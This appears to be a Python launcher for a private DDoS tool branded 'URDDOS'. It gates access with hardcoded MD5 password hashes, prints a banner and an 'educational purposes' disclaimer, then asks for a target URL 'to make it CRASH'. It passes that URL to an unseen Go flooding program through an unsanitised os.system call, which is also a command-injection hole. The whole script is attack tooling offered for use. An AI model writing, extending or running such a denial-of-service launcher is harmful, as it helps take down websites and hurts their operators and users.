import getpass
import os
import hashlib
from colorama import init, Fore

init()

mainu = "a3c51a6c750d9ffe04926da5e6bc491f"
mainup = "fd12cc0b06e6ead008d35ae16ba5d7c2"

def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

def run_crash(url, method):
 os.system(f'go run main.go -site {url} -data {method}')

username = input("Enter your username: ")
password = getpass.getpass("Enter your password: ")

checku = md5_hash(username)
checkp = md5_hash(password)

if checku == mainu and checkp == mainup:
    print("Authentication successful.")

    colored_text = (
        f"{Fore.YELLOW}"
        f"/$$   /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ \n"
        f"| $$  | $$| $$__  $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$\n"
        f"| $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/\n"
        f"| $$  | $$| $$$$$$$/| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ \n"
        f"| $$  | $$| $$__  $$| $$  | $$| $$  | $$| $$  | $$ \____  $$\n"
        f"| $$  | $$| $$  \ $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$\n"
        f"|  $$$$$$/| $$  | $$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/\n"
        f" \______/ |__/  |__/|_______/ |_______/  \______/  \______/ \n"
        f"{Fore.GREEN}PRIVATE TOOL BY URDDOS AND SIWAMKING{Fore.RESET}"
    )

    print(colored_text)
    colored_text1 = (
        f"{Fore.YELLOW}Tool exclusively for educational purposes, not for commercial or harmful use. {Fore.RESET}"
    )
    print(colored_text1)
    colored_text2 = (
        f"{Fore.GREEN}We disclaim any responsibility for outcomes resulting from tool usage.{Fore.RESET}"
    )
    print(colored_text2)

    method_choice = input("Type CRASH: ").strip()

    if method_choice == "CRASH":
        print("CRASH METHOD ACTIVATED...")
        url = input("Enter the URL to make it CRASH: ")
        method = "GET"
        run_crash(url, method)
    else:
        print("Invalid method selection.")
else:
    print("Authentication failed. Access denied.")
